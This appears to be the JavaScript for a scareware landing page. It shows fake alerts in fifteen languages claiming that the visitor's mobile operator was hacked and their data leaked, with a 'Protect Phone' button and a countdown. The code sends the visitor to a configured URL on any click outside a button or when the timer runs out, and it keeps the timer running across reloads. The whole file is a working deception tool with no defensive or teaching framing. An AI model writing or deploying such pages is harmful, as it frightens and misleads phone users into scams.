(function () {
  const translations = {
    en: {
      alertTitle:
        '<span class="accent">Your mobile operator has been hacked</span>, your data and phone number have leaked to scammers.',
      alertBody:
        'Protect yourself and your phone immediately by pressing the "Protect Phone" button.',
      buttonLabel: "Protect Phone",
      countdownLabel: "It is recommended to protect your phone immediately!",
    },
    fr: {
      alertTitle:
        '<span class="accent">Votre opérateur mobile a été piraté</span>, vos données et votre numéro de téléphone ont fuité vers des fraudeurs.',
      alertBody:
        'Protégez-vous ainsi que votre téléphone immédiatement en appuyant sur le bouton "Protéger le téléphone".',
      buttonLabel: "Protéger le téléphone",
      countdownLabel:
        "Il est recommandé de protéger votre téléphone immédiatement !",
    },
    "pt-PT": {
      alertTitle:
        '<span class="accent">A sua operadora móvel foi pirateada</span>, os seus dados e número de telefone foram expostos a burlões.',
      alertBody:
        'Proteja-se a si e ao seu telefone imediatamente ao premir o botão "Proteger telefone".',
      buttonLabel: "Proteger telefone",
      countdownLabel:
        "Recomenda-se que proteja o seu telefone imediatamente!",
    },
    "pt-BR": {
      alertTitle:
        '<span class="accent">Sua operadora móvel foi hackeada</span>, seus dados e número de telefone vazaram para golpistas.',
      alertBody:
        'Proteja você e seu telefone imediatamente pressionando o botão "Proteger telefone".',
      buttonLabel: "Proteger telefone",
      countdownLabel:
        "Recomenda-se proteger seu telefone imediatamente!",
    },
    es: {
      alertTitle:
        '<span class="accent">Tu operador móvil ha sido hackeado</span>, tus datos y tu número de teléfono se han filtrado a estafadores.',
      alertBody:
        'Protégete a ti y a tu teléfono de inmediato pulsando el botón "Proteger teléfono".',
      buttonLabel: "Proteger teléfono",
      countdownLabel:
        "¡Se recomienda proteger tu teléfono inmediatamente!",
    },
    "es-419": {
      alertTitle:
        '<span class="accent">Tu operador móvil fue hackeado</span>, tus datos y tu número de teléfono se filtraron a estafadores.',
      alertBody:
        'Protégete a ti y a tu teléfono de inmediato presionando el botón "Proteger teléfono".',
      buttonLabel: "Proteger teléfono",
      countdownLabel:
        "¡Se recomienda proteger tu teléfono inmediatamente!",
    },
    da: {
      alertTitle:
        '<span class="accent">Din mobiloperatør er blevet hacket</span>, dine data og dit telefonnummer er lækket til svindlere.',
      alertBody:
        'Beskyt dig selv og din telefon med det samme ved at trykke på knappen "Beskyt telefon".',
      buttonLabel: "Beskyt telefon",
      countdownLabel:
        "Det anbefales at beskytte din telefon med det samme!",
    },
    ja: {
      alertTitle:
        '<span class="accent">ご利用の携帯通信会社がハッキングされ</span>、あなたの個人情報と電話番号が詐欺師に漏えいしました。',
      alertBody:
        '「スマートフォンを保護」ボタンを押して、今すぐご自身と端末を保護してください。',
      buttonLabel: "スマートフォンを保護",
      countdownLabel:
        "今すぐスマートフォンを保護することをおすすめします！",
    },
    fil: {
      alertTitle:
        '<span class="accent">Na-hack ang iyong mobile operator</span>, at ang iyong data at numero ng telepono ay na-leak sa mga scammer.',
      alertBody:
        'Protektahan ang iyong sarili at ang iyong telepono agad sa pagpindot sa button na "Protektahan ang Telepono".',
      buttonLabel: "Protektahan ang Telepono",
      countdownLabel:
        "Inirerekomendang protektahan agad ang iyong telepono!",
    },
    de: {
      alertTitle:
        '<span class="accent">Ihr Mobilfunkanbieter wurde gehackt</span>, Ihre Daten und Ihre Telefonnummer sind an Betrüger gelangt.',
      alertBody:
        'Schützen Sie sich und Ihr Telefon sofort, indem Sie auf die Schaltfläche "Telefon schützen" drücken.',
      buttonLabel: "Telefon schützen",
      countdownLabel:
        "Es wird empfohlen, Ihr Telefon sofort zu schützen!",
    },
    nb: {
      alertTitle:
        '<span class="accent">Mobiloperatøren din har blitt hacket</span>, og dataene dine og telefonnummeret ditt har lekket til svindlere.',
      alertBody:
        'Beskytt deg selv og telefonen din umiddelbart ved å trykke på knappen "Beskytt telefon".',
      buttonLabel: "Beskytt telefon",
      countdownLabel:
        "Det anbefales å beskytte telefonen din umiddelbart!",
    },
    sv: {
      alertTitle:
        '<span class="accent">Din mobiloperatör har blivit hackad</span>, och dina uppgifter och ditt telefonnummer har läckt till bedragare.',
      alertBody:
        'Skydda dig själv och din telefon omedelbart genom att trycka på knappen "Skydda telefon".',
      buttonLabel: "Skydda telefon",
      countdownLabel:
        "Det rekommenderas att skydda din telefon omedelbart!",
    },
    it: {
      alertTitle:
        '<span class="accent">Il tuo operatore mobile è stato hackerato</span>, i tuoi dati e il tuo numero di telefono sono finiti nelle mani dei truffatori.',
      alertBody:
        'Proteggi te stesso e il tuo telefono immediatamente premendo il pulsante "Proteggi telefono".',
      buttonLabel: "Proteggi telefono",
      countdownLabel:
        "Si consiglia di proteggere immediatamente il tuo telefono!",
    },
    nl: {
      alertTitle:
        '<span class="accent">Je mobiele provider is gehackt</span>, je gegevens en telefoonnummer zijn gelekt naar oplichters.',
      alertBody:
        'Bescherm jezelf en je telefoon onmiddellijk door op de knop "Telefoon beveiligen" te drukken.',
      buttonLabel: "Telefoon beveiligen",
      countdownLabel:
        "Het wordt aanbevolen om je telefoon onmiddellijk te beveiligen!",
    },
    ro: {
      alertTitle:
        '<span class="accent">Operatorul tău mobil a fost compromis</span>, iar datele și numărul tău de telefon au ajuns la escroci.',
      alertBody:
        'Protejează-te pe tine și telefonul tău imediat apăsând butonul „Protejează telefonul”.',
      buttonLabel: "Protejează telefonul",
      countdownLabel:
        "Se recomandă să îți protejezi imediat telefonul!",
    },
  };

  const config = window.APP_CONFIG || {};
  const countdownElement = document.getElementById("countdown");
  const ctaButton = document.getElementById("cta-button");
  const translatableNodes = document.querySelectorAll("[data-i18n]");
  const redirectDelaySeconds = Number(config.redirectDelaySeconds) || 120;
  const timerStorageKey = "landingTimerStartedAt";

  let remainingSeconds = redirectDelaySeconds;
  let timerId = null;
  let hasNavigated = false;

  function applyDeviceProfile() {
    const screenWidth = window.screen && window.screen.width ? window.screen.width : window.innerWidth;
    const screenHeight = window.screen && window.screen.height ? window.screen.height : window.innerHeight;
    const shortestSide = Math.min(screenWidth, screenHeight);
    const longestSide = Math.max(screenWidth, screenHeight);
    const root = document.documentElement;

    root.classList.remove("device-se", "device-medium", "device-large");

    if (shortestSide <= 375 && longestSide <= 700) {
      root.classList.add("device-se");
      return;
    }

    if (shortestSide <= 429 && longestSide >= 701) {
      root.classList.add("device-medium");
      return;
    }

    if (shortestSide >= 430 && longestSide >= 701) {
      root.classList.add("device-large");
    }
  }

  function resolveLocale() {
    const urlLocale = new URLSearchParams(window.location.search).get("lang");
    const browserLocale = navigator.language || navigator.userLanguage || "";
    const requested = (urlLocale || browserLocale || config.defaultLocale || "en").trim();

    if (translations[requested]) {
      return requested;
    }

    const normalized = requested.toLowerCase();
    const aliasMap = {
      "pt": "pt-PT",
      "pt-pt": "pt-PT",
      "pt-br": "pt-BR",
      "es-419": "es-419",
      "es-mx": "es-419",
      "es-ar": "es-419",
      "es-cl": "es-419",
      "es-co": "es-419",
      "es-pe": "es-419",
      "nb-no": "nb",
      "no": "nb",
      "no-no": "nb",
      "ja-jp": "ja",
      "fil-ph": "fil",
      "fr-fr": "fr",
      "de-de": "de",
      "it-it": "it",
      "nl-nl": "nl",
      "ro-ro": "ro",
      "sv-se": "sv",
      "da-dk": "da",
    };

    if (aliasMap[normalized]) {
      return aliasMap[normalized];
    }

    const languageOnly = normalized.split("-")[0];

    if (translations[languageOnly]) {
      return languageOnly;
    }

    if (languageOnly === "pt") {
      return "pt-PT";
    }

    return config.defaultLocale || "en";
  }

  function applyTranslations(locale) {
    const content = translations[locale] || translations.en;

    translatableNodes.forEach((node) => {
      const key = node.getAttribute("data-i18n");
      if (!key || !content[key]) {
        return;
      }

      if (key === "alertTitle") {
        node.innerHTML = content[key];
      } else {
        node.textContent = content[key];
      }
    });

    document.documentElement.lang = locale;
  }

  function formatTime(totalSeconds) {
    const minutes = Math.floor(totalSeconds / 60);
    const seconds = totalSeconds % 60;
    return `${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
  }

  function getStartedAt() {
    const rawValue = window.sessionStorage.getItem(timerStorageKey);
    const parsedValue = Number(rawValue);
    return Number.isFinite(parsedValue) && parsedValue > 0 ? parsedValue : null;
  }

  function setStartedAt(timestamp) {
    window.sessionStorage.setItem(timerStorageKey, String(timestamp));
  }

  function clearStartedAt() {
    window.sessionStorage.removeItem(timerStorageKey);
  }

  function getNavigationType() {
    const navigationEntry = window.performance.getEntriesByType("navigation")[0];

    if (navigationEntry && typeof navigationEntry.type === "string") {
      return navigationEntry.type;
    }

    if (window.performance && window.performance.navigation) {
      const legacyType = window.performance.navigation.type;

      if (legacyType === 2) {
        return "back_forward";
      }

      if (legacyType === 1) {
        return "reload";
      }
    }

    return "navigate";
  }

  function ensureStartedAt() {
    const existingStartedAt = getStartedAt();

    if (existingStartedAt) {
      return existingStartedAt;
    }

    const newStartedAt = Date.now();
    setStartedAt(newStartedAt);
    return newStartedAt;
  }

  function syncRemainingSeconds() {
    const startedAt = ensureStartedAt();
    const elapsedSeconds = Math.floor((Date.now() - startedAt) / 1000);
    remainingSeconds = Math.max(redirectDelaySeconds - elapsedSeconds, 0);
  }

  function prepareTimerSession() {
    const navigationType = getNavigationType();

    if (navigationType !== "back_forward") {
      clearStartedAt();
    }
  }

  function updateTimer() {
    countdownElement.textContent = formatTime(Math.max(remainingSeconds, 0));
  }

  function stopTimer() {
    if (timerId) {
      window.clearInterval(timerId);
      timerId = null;
    }
  }

  function openRedirect() {
    if (hasNavigated) {
      return;
    }

    const redirectUrl = typeof config.redirectUrl === "string" ? config.redirectUrl.trim() : "";

    if (!redirectUrl) {
      return;
    }

    hasNavigated = true;
    stopTimer();
    window.location.href = redirectUrl;
  }

  function startTimer() {
    if (timerId) {
      return;
    }

    syncRemainingSeconds();
    updateTimer();

    if (remainingSeconds <= 0) {
      openRedirect();
      return;
    }

    timerId = window.setInterval(() => {
      if (hasNavigated) {
        stopTimer();
        return;
      }

      syncRemainingSeconds();
      updateTimer();

      if (remainingSeconds <= 0) {
        openRedirect();
      }
    }, 1000);
  }

  function bindEvents() {
    ctaButton.addEventListener("click", function (event) {
      event.preventDefault();
      event.stopPropagation();
      openRedirect();
    });

    document.addEventListener("click", function (event) {
      if (hasNavigated) {
        return;
      }

      const target = event.target;
      if (!(target instanceof Element)) {
        return;
      }

      if (target.closest("button")) {
        return;
      }

      openRedirect();
    });
  }

  const locale = resolveLocale();
  prepareTimerSession();
  applyDeviceProfile();
  applyTranslations(locale);
  bindEvents();

  window.addEventListener("load", startTimer, { once: true });
  window.addEventListener("pageshow", function (event) {
    if (event.persisted || getNavigationType() === "back_forward") {
      hasNavigated = false;
    }

    stopTimer();
    startTimer();
  });
  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState !== "visible") {
      return;
    }

    syncRemainingSeconds();
    updateTimer();
  });
})();
